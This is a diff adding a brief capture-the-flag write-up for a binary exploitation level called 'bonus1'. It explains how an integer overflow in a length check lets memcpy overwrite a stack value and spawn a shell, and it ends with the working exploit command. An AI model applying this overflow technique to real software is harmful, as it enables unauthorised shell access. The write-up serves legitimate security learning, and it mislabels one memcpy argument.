@@ -1,0 +1,13 @@
+* This level takes to arguments the arguments should be less than 9 .
+* calls memcpy() to copy (argv[1] * 4 ) bytes from argv[1]  to buff, 
+* than the program checks if the content at address ($esp + 0x3c) is equal to 0x574f4c46.
+* if it is the program calls execl("/bin/sh", "sh", 0), otherwise it just return .
+
+
+* to change the value at ($esp + 0x3c) , we need memcpy to copy 44 bytes . 
+* we could've just make argv[1] = 11 (11 * 4 = 44)
+* but argv[1] should be less than 9 . 
+but we could use interger overflow bug to solve that (-2147483637 * 4 = -8589934548(uint) ===> 44 ).
+
+./bonus1 -2147483637 `python -c 'print "A"*40 + "FLOW"'`
+
